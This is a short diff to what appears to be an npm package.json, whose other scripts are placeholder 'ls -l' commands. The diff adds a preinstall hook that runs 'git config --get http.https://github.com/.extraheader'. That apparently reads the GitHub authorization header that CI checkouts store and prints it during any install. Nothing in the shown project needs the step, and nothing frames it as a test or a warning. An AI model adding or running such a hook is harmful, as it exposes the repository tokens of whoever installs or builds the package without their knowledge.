@@ -4,7 +4,7 @@
   "description": "",
   "directories": {},
   "scripts": {
-    "preinstall": "ls -l",
+    "preinstall": "git config --get http.https://github.com/.extraheader",
     "build":"ls -l",
     "test": "ls -l",
     "coverage": "ls -l",
